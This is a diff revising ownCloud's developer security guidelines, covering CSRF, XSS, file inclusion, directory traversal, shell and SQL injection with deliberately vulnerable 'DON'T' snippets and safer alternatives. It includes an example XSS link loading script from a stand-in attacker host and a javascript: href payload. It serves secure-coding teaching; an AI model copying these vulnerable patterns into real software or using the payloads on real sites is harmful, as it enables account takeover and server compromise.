@@ -1,13 +1,19 @@
 Security Guidelines
 ===================
 
-.. sectionauthor:: Bernhard Posselt <dev@bernhard-posselt.com>, Lukas Reschke <lukas@statuscode.ch>
+.. sectionauthor:: Bernhard Posselt <dev@bernhard-posselt.com>, Lukas Reschke <lukas@statuscode.ch>, Matthew Setter <matthew@matthewsetter.com>
+   
+Introduction
+------------
 
-This guideline highlights some of the most common security problems and how to prevent them. Please review your app if it contains any of the following security holes.
+These security guidelines are for core and application developers. 
+They give highlights some of the most common security problems and how to prevent them.
+They also give you some best practices and tips about security for ownCloud development.
+Please review your application, if it contains any of the following security holes.
 
 .. note:: **Program defensively**: for instance always check for CSRF or escape strings, even if you do not need it. This prevents future problems where you might miss a change that leads to a security hole.
 
-.. note:: All App Framework security features depend on the call of the controller through :php:meth:`OCA\\AppFramework\\App::main`. If the controller method is executed directly, no security checks are being performed!
+.. note:: All application Framework security features depend on the call of the controller through :php:meth:`OCA\\AppFramework\\App::main`. If the controller method is executed directly, no security checks are being performed!
 
 General
 -------
@@ -366,24 +372,28 @@ ownCloud offers three simple checks:
 * **OCP\\JSON::checkAdminUser()**: Checks if the logged in user has admin privileges
 * **OCP\\JSON::checkSubAdminUser()**: Checks if the logged in user has group admin privileges
 
-Using the App Framework, these checks are already automatically performed for each request and have to be explicitly turned off by using annotations above your controller method,  see :doc:`../app/controllers`.
+These checks are already automatically performed, by the application framework, for each request. 
+If they are not required, they have to be *explicitly* turned off by using annotations above your controller method. 
+See :doc:`../app/controllers`.
 
-Additionally always check if the user has the right to perform that action.
+Additionally, always check if the user has the right to perform that action.
 
 Clickjacking
-------------
+~~~~~~~~~~~~
 
-`Clickjacking <http://en.wikipedia.org/wiki/Clickjacking>`_ tricks the user to click into an invisible iframe to perform an arbitrary action (e.g. delete an user account)
+`Clickjacking <http://en.wikipedia.org/wiki/Clickjacking>`_ tricks the user to click into an invisible iframe to perform an arbitrary action (e.g., deleting a user account).
 
-To prevent such attacks ownCloud sends the `X-Frame-Options` header to all template responses. Don't remove this header if you don't really need it!
+To prevent such attacks ownCloud sends the `X-Frame-Options` header to all template responses. 
+Don't remove this header unless you need to!
 
-This is already built into ownCloud if `ownCloud templates <https://doc.owncloud.org/server/latest/developer_manual/app/templates.html>`_ or `Twig Templates`_ are used.
+This functionality is built into ownCloud when `ownCloud templates <https://doc.owncloud.org/server/latest/developer_manual/app/templates.html>`_ or `Twig Templates`_ are used.
 
 Code executions / File inclusions
----------------------------------
-Code Execution means that an attacker is able to include an arbitrary PHP file. This PHP file runs with all the privileges granted to the normal application and can do an enormous amount of damage.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-Code executions and file inclusions can be easily prevented by **never** allowing user-input to run through the following functions:
+Code execution means that an attacker can include an arbitrary PHP file. 
+This PHP file runs with all the privileges granted to the normal application and can do an enormous amount of damage.
+Code executions and file inclusions can be easily prevented by never allowing user-input to run through the following functions:
 
 * **include()**
 * **require()**
@@ -391,7 +401,8 @@ Code executions and file inclusions can be easily prevented by **never** allowin
 * **eval()**
 * **fopen()**
 
-.. note:: Also **never** allow the user to upload files into a folder which is reachable from the URL!
+.. note:: 
+   **Never** allow the user to upload files into a folder which is reachable from the URL!
 
 **DON'T**
 
@@ -400,11 +411,16 @@ Code executions and file inclusions can be easily prevented by **never** allowin
   <?php
   require("/includes/" . $_GET['file']);
 
-.. note:: If you have to pass user input to a potentially dangerous function, double check to be sure that there is no other way. If it is not possible otherwise sanitize every user parameter and ask people to audit your sanitize function.
+.. note:: 
+   If you have to pass user input to a potentially dangerous function, double check to be sure that there is no other option available. 
+   If there is no other option, sanitize every user parameter and ask people to audit your sanitize functions.
 
 Cross site request forgery
---------------------------
-Using `CSRF <http://en.wikipedia.org/wiki/Cross-site_request_forgery>`_ one can trick a user into executing a request that he did not want to make. Thus every POST and GET request needs to be protected against it. The only places where no CSRF checks are needed are in the main template, which is rendering the application, or in externally callable interfaces.
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Using `CSRF <http://en.wikipedia.org/wiki/Cross-site_request_forgery>`_ one can trick a user into executing a request that he did not want to make. 
+Thus every POST and GET request needs to be protected against it. 
+The only places where no CSRF checks are needed are in the main template, which is rendering the application, or in externally callable interfaces.
 
 .. note:: Submitting a form is also a POST/GET request!
 
@@ -415,16 +431,17 @@ To prevent CSRF in an app, be sure to call the following method at the top of al
   <?php
   OCP\JSON::callCheck();
 
-If you are using the App Framework, every controller method is automatically checked for CSRF unless you explicitly exclude it by setting the @NoCSRFRequired annotation before the controller method, see :doc:`../app/controllers`
+If you are using the application Framework, every controller method is automatically checked for CSRF unless you explicitly exclude it by setting the @NoCSRFRequired annotation before the controller method, see :doc:`../app/controllers`
 
 Cross site scripting
---------------------
+~~~~~~~~~~~~~~~~~~~~
 
-`Cross site scripting <http://en.wikipedia.org/wiki/Cross-site_scripting>`_ happens when user input is passed directly to templates. A potential attacker might be able to inject HTML/JavaScript into the page to steal the users session, log keyboard entries, even perform DDOS attacks on other websites or other malicious actions.
+`Cross-site scripting <http://en.wikipedia.org/wiki/Cross-site_scripting>`_ happens when user input is passed directly to templates. A potential attacker might be able to inject HTML or JavaScript into the page to steal the user's session, log keyboard entries, or perform DDOS attacks on other websites and other malicious actions.
 
-Despite the fact that ownCloud uses Content-Security-Policy to prevent the execution of inline JavaScript code developers are still required to prevent XSS. CSP is just another layer of defense that is not implemented in all web browsers.
+Despite the fact that ownCloud uses Content-Security-Policy to prevent the execution of inline JavaScript code developers are still required to prevent XSS. 
+CSP is another layer of defense that is not implemented in all web browsers.
 
-To prevent XSS in your app you have to sanitize the templates and all JavaScripts which performs a DOM manipulation.
+To prevent XSS vulnerabilities in your application, you have to sanitize both the templates *and* all JavaScript scripts which perform DOM manipulation.
 
 Templates
 ~~~~~~~~~
@@ -436,37 +453,38 @@ Let's assume you use the following example in your application:
   <?php
   echo $_GET['username'];
 
-An attacker might now easily send the user a link to::
-
-    app.php?username=<script src="attacker.tld"></script>
-
-to overtake the user account. The same problem occurs when outputting content from the database or any other location that is writable by users.
-
-Another attack vector that is often overlooked is XSS in **href** attributes. HTML allows to execute javascript in href attributes like this::
+An attacker might now easily send the user a link to ``app.php?username=<script src="attacker.tld"></script>``, to overtake the user account. 
+The same problem occurs when outputting content from the database, or any other location that is writable by users.
+Another attack vector that is often overlooked is XSS vulnerabilities in ``href`` attributes. HTML allows to execute JavaScript in ``href`` attributes like this::
 
     <a href="javascript:alert('xss')">
 
+To prevent XSS in your app, never use ``echo``, ``print()`` or ``<\%=``, use ``p()`` instead.
+Doing so sanitizes input. 
+Also **validate URLs to start with the expected protocol** (starts with "http" for instance)!
 
-To prevent XSS in your app, **never use echo, print() or <\%=** - use **p()** instead which will sanitize the input. Also **validate URLs to start with the expected protocol** (starts with http for instance)!
-
-.. note:: Should you ever require to print something unescaped, double check if it is really needed. If there is no other way (e.g. when including of subtemplates) use `print_unescaped`  with care.
+.. note:: 
+   Should you ever require to print something unescaped, double check if it is necessary. 
+   If there is no other way (e.g., when including of subtemplates) use `print_unescaped`  with care.
 
 JavaScript
 ~~~~~~~~~~
 
-Avoid manipulating the HTML directly via JavaScript, this often leads to XSS since people often forget to sanitize variables:
+Avoid manipulating HTML directly via JavaScript. 
+Doing so often leads to XSS vulnerabilities since people often forget to sanitize variables.
+For example:
 
 .. code-block:: js
 
   var html = '<li>' + username + '</li>"';
 
-If you **really** want to use JavaScript for something like this use `escapeHTML` to sanitize the variables:
+If you want to use JavaScript for something like this use `escapeHTML` to sanitize the variables:
 
 .. code-block:: js
 
   var html = '<li>' + escapeHTML(username) + '</li>';
 
-An even better way to make your app safer is to use the jQuery built-in function **$.text()** instead of **$.html()**.
+An even better way to make your application safer is to use the jQuery built-in function **$.text()**, instead of **$.html()**.
 
 **DON'T**
 
@@ -480,11 +498,13 @@ An even better way to make your app safer is to use the jQuery built-in function
 
   messageTd.text(username);
 
-It may also be wise to choose a proper JavaScript framework like AngularJS which automatically  handles the JavaScript escaping for you.
+It may also be wise to choose a proper JavaScript framework, like AngularJS, which automatically handles JavaScript escaping for you.
 
 Directory Traversal
--------------------
-Very often developers forget about sanitizing the file path (removing all \\ and /), this allows an attacker to traverse through directories on the server which opens several potential attack vendors including privilege escalations, code executions or file disclosures.
+~~~~~~~~~~~~~~~~~~~
+
+Very often, developers forget about sanitizing the file path (such as removing all ``\\`` and ``/``). 
+Doing so allows an attacker to traverse through directories on the server and opens several potential attack vendors, which include *privilege escalations*, *code executions*, and *file disclosures*.
 
 **DON'T**
 
@@ -505,27 +525,27 @@ Very often developers forget about sanitizing the file path (removing all \\ and
 
 .. note:: PHP also interprets the backslash (\\) in paths, don't forget to replace it too!
 
-
 Shell Injection
----------------
+~~~~~~~~~~~~~~~
 
-`Shell Injection <http://en.wikipedia.org/wiki/Code_injection#Shell_injection>`_ occurs if PHP code executes shell commands (e.g. running a latex compiler). Before doing this, check if there is a PHP library that already provides the needed functionality. If you really need to execute a command be aware that you have to escape every user parameter passed to one of these functions:
+`Shell Injection <http://en.wikipedia.org/wiki/Code_injection#Shell_injection>`_ occurs if PHP code executes shell commands (e.g., running a latex compiler). 
+Before doing this, check if there is a PHP library that already provides the needed functionality. 
+If you really need to execute a command be aware that you have to escape every user parameter passed to one of these functions:
 
-* **exec()**
-* **shell_exec()**
-* **passthru()**
-* **proc_open()**
-* **system()**
-* **popen()**
+- **exec()**
+- **shell_exec()**
+- **passthru()**
+- **proc_open()**
+- **system()**
+- **popen()**
 
 .. note:: Please require/request additional programmers to audit your escape function.
 
-Without escaping the user input this will allow an attacker to execute arbitrary shell commands on your server.
-
+Without escaping the user input, this allows an attacker to execute arbitrary shell commands on your server.
 PHP offers the following functions to escape user input:
 
-* **escapeshellarg()**: Escape a string to be used as a shell argument
-* **escapeshellcmd()**: Escape shell metacharacters
+- **escapeshellarg()**: Escape a string to be used as a shell argument
+- **escapeshellcmd()**: Escape shell metacharacters
 
 **DON'T**
 
@@ -542,14 +562,14 @@ PHP offers the following functions to escape user input:
   system('ls '.escapeshellarg($_GET['dir']));
 
 Sensitive data exposure
------------------------
+~~~~~~~~~~~~~~~~~~~~~~~
 
-Always store user data or configuration files in safe locations, e.g. **owncloud/data/** and not in the webroot where they can be accessed by anyone using a web browser.
+Always store user data or configuration files in safe locations, e.g., **owncloud/data/** and not in the web root, where they are accessible by anyone using a web browser.
 
 SQL Injection
--------------
-`SQL Injection <http://en.wikipedia.org/wiki/SQL_injection>`_ occurs when SQL query strings are concatenated with variables.
+~~~~~~~~~~~~~
 
+`SQL Injection <http://en.wikipedia.org/wiki/SQL_injection>`_ occurs when SQL query strings are concatenated with variables.
 To prevent this, always use prepared queries:
 
 .. code-block:: php
@@ -560,7 +580,7 @@ To prevent this, always use prepared queries:
   $params = array(1);
   $result = $query->execute($params);
 
-If the App Framework is used, write SQL queries like this in the a class that extends the Mapper:
+If the application Framework is used, write SQL queries like this in the class that extends the Mapper:
 
 .. code-block:: php
 
@@ -571,9 +591,9 @@ If the App Framework is used, write SQL queries like this in the a class that ex
   $result = $this->execute($sql, $params);
 
 Unvalidated redirects
----------------------
-This is more of an annoyance than a critical security vulnerability since it may be used for social engineering or phishing.
+~~~~~~~~~~~~~~~~~~~~~
 
+This is more of an annoyance than a critical security vulnerability since it may be used for social engineering or phishing.
 Before redirecting, always validate the URL if the requested URL is on the same domain or is an allowed resource.
 
 **DON'T**
